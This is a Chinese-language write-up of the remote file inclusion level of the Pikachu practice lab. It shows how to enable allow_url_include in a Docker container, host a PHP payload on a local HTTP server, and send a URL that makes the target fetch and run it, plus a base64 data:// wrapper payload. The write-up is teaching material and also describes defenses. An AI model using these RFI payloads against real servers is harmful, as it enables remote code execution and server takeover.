File Inclusion(remote) - Pikachu Writeup

2026年9月19日 Pikachu Web安全 文件包含

一、题目信息

  • 题目名称：File Inclusion(remote)
  • 题目平台：Pikachu 漏洞练习平台
  • 题目类型：Web安全 / 文件包含漏洞 / 远程文件包含（RFI） / 环境配置修改
  • 靶场链接：http://localhost:8080/vul/fileinclude/fi_remote.php
  • 涉及工具：浏览器、终端（Mac）、Docker、Python 3（简易 HTTP 服务）

二、解题步骤

1. 分析题目考什么

本题的核心考点是远程文件包含漏洞（Remote File Inclusion, RFI）。与本地文件包含（LFI）读取服务器已有文件不同，RFI 允许攻击者通过传入一个外部 URL，让目标服务器主动通过 HTTP 等协议去下载并执行该文件。RFI 的利用条件极其苛刻，必须要求 PHP 配置中 allow_url_include 为 On 状态。

2. 怎么想（破题思路）

进入页面后，直接弹出警告：“你的 allow_url_include 没有打开”。这意味着默认环境下无法直接利用。解题思路如下：

  • 要解出此题，必须深入 Docker 容器内部，修改 PHP 配置文件并重启服务。
  • 在攻击机（宿主机）本地搭建一个 HTTP 服务，托管一个恶意的 PHP 文件（如 shell.txt）。
  • 修改靶场地址栏参数，将 filename 参数指向我们搭建的外部 HTTP 服务地址，让靶场远程下载并解析该文件。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：默认配置 allow_url_include 为 Off

踩坑情况：打开页面报错，直接阻碍了漏洞的利用。

原因分析：PHP 5.2.0 之后，为了安全默认关闭了远程包含功能。

改进方式：进入 Docker 容器，使用 sed 命令修改 php.ini，将其改为 On 并重启服务。

踩坑记录二：修改了 CLI 配置文件而非 Apache 配置文件

踩坑情况：在容器内执行 php --ini 看到了配置文件路径（如 /etc/php/7.3/cli/conf.d/），修改后页面依然报错。

原因分析：php --ini 查看到的是命令行（CLI）模式下的配置文件。靶场是通过 Web 服务器（Apache）访问的，Apache 有独立的 PHP 配置文件（如 /etc/php/7.3/apache2/php.ini）。

改进方式：直接修改 Apache 专属的 PHP 配置文件：/etc/php/7.3/apache2/php.ini。

踩坑记录三：容器内 service 命令失败导致配置未生效

踩坑情况：在容器内执行 service apache2 restart 返回 [fail]，导致配置修改后网页依然报错。

原因分析：Docker 容器通常没有完整的 Systemd/Init 系统，无法通过 service 命令管理进程。

改进方式：退出容器，在宿主机（Mac）终端执行 docker restart [容器ID] 强制重启整个容器，使配置生效。

踩坑记录四：Docker 网络隔离导致无法访问 127.0.0.1

踩坑情况：使用 http://127.0.0.1:8000/shell.txt 作为 Payload 时，靶场无法下载文件。

原因分析：Docker 容器有自己独立的网络命名空间，它的 127.0.0.1 指向的是容器本身，而不是宿主 Mac 电脑。

改进方式：在 Mac 终端使用 ifconfig | grep "inet " 查询宿主机的真实局域网 IP（如 192.168.1.12），并在 Payload 中使用该 IP。

终极解法：搭建 HTTP 服务并发动 RFI 攻击

第一步：修改靶场环境

docker exec -it a9d945b12a3e /bin/bash
grep "allow_url_include" /etc/php/7.3/apache2/php.ini
sed -i 's/allow_url_include = Off/allow_url_include = On/g' /etc/php/7.3/apache2/php.ini
exit
docker restart a9d945b12a3e

第二步：在宿主机准备恶意文件并开启服务

在桌面创建 shell.txt，内容为 <?php phpinfo(); ?>，然后执行：

cd ~/Desktop
python3 -m http.server 8000

第三步：构造恶意 Payload 发起攻击

在浏览器地址栏输入：

http://localhost:8080/vul/fileinclude/fi_remote.php?filename=http://192.168.1.12:8000/shell.txt&submit=提交

代码逐个符号深度解析：

  • filename=：后端用于接收文件路径的参数名。
  • http://：触发远程包含的核心。告诉 PHP 使用 HTTP 协议去请求外部资源。
  • 192.168.1.12：宿主机的真实局域网 IP 地址，确保 Docker 容器可以路由到。
  • :8000：本地 Python HTTP 服务监听的端口。
  • /shell.txt：准备好的恶意木马文件。虽然后缀是 txt，但 PHP 只要包含它，就会将其中的 <?php ... ?> 当作代码执行。

成功提交后，浏览器弹出紫色的 phpinfo 页面，证明 RFI 漏洞利用成功，实现了远程代码执行（RCE）。

4. 怎么迁移（跨领域联想）

  • 伪协议利用（PHP Wrappers）：如果远程 HTTP 包含被拦截，可以尝试使用 data:// 伪协议（如 data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==），直接在 URL 中嵌入 Base64 编码的 PHP 代码，无需搭建服务器。
  • 代码审计与安全开发：防御文件包含漏洞的核心是：绝对不要相信用户的输入，永远使用白名单机制。仅在代码中允许包含固定的文件名，杜绝任何动态路径拼接。
  • 网络隔离与 Docker 安全：在实际的生产环境中，应该对 Docker 容器网络进行隔离。同时，对于通过 HTTP 协议外联的行为要严加管控，防止攻击者利用 SSRF 或 RFI 进行横向渗透。

三、名词大全与原理深度复盘

1. 远程文件包含（RFI）与本地文件包含（LFI）的区别

LFI 只能读取和包含服务器本地已有的文件（如 /etc/passwd），主要用于信息窃取；RFI 可以包含远程服务器上的文件，允许攻击者上传恶意木马并执行，直接获取 WebShell，危害等级比 LFI 高出数倍。

2. PHP 配置项 allow_url_include

这是 PHP 中控制是否允许通过 include/require 加载远程 URL 的开关。当它被设置为 On 时，RFI 漏洞才存在。它在 PHP 5.2.0 之后默认是关闭的，并且即便是开启，也通常要求 allow_url_fopen 也是开启状态。

3. Docker 网络模型

Docker 容器拥有独立的网络栈（Network Namespace）。容器内的 localhost 指的是容器自身。宿主机要访问容器需要通过端口映射（-p 8080:80）；容器要访问宿主机，需要通过宿主机的物理网卡 IP 或配置 Docker 的 host 网络模式。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 File Inclusion(local) 相比：Local 只能读取本地文件（主要是信息泄露）；Remote 可以加载外部 URL，进而执行任意恶意代码（RCE）。Local 依赖路径穿越（../），Remote 依赖外部服务器托管。
  • 与 RCE exec "eval" 相比：eval 是代码执行，直接在参数里写 PHP 代码；RFI 是文件包含，代码在外部文件里，需要服务器去远程拉取并解析。

2. 这种题目的出现原因（为什么存在）

这类漏洞的出现，是因为早期 PHP 开发者为了提升代码的模块化能力，允许动态引入外部文件。但随着网络安全环境的恶化，攻击者发现可以通过传入恶意的远程 URL 来注入木马。因此，现代 PHP 逐渐收紧了安全策略，默认关闭了 allow_url_include，这就是你当前靶场报错的原因。

3. 这种应用在实际中如何体现？

RFI 是一种极其危险的漏洞，一旦发现，通常意味着服务器已被攻陷。在真实的红蓝对抗中，如果通过 RFI 拿到了 WebShell，攻击者会立即提权、安装后门、进行内网横向移动。由于现代环境默认关闭该配置，RFI 在实战中已逐渐减少，但掌握其原理对理解 LFI、伪协议利用等高级技巧至关重要。

4. 如何抽象理解概念（大白话理解）

如果把服务器比作一个图书馆：

  • Local 包含：你把图书馆管理员叫来，让他从自己的书架（本地）上拿一本书给你。
  • Remote 包含：你给图书馆管理员留了一个外网的地址，说：“这本书在外面的网店里，你去帮我买回来，并大声朗读出来”。如果管理员真的照做了，并且不仅读了，还按书上的指令“把图书馆的门打开”，这就是 RFI 的威力。

做一道题，就要往自己脑子里装点东西。
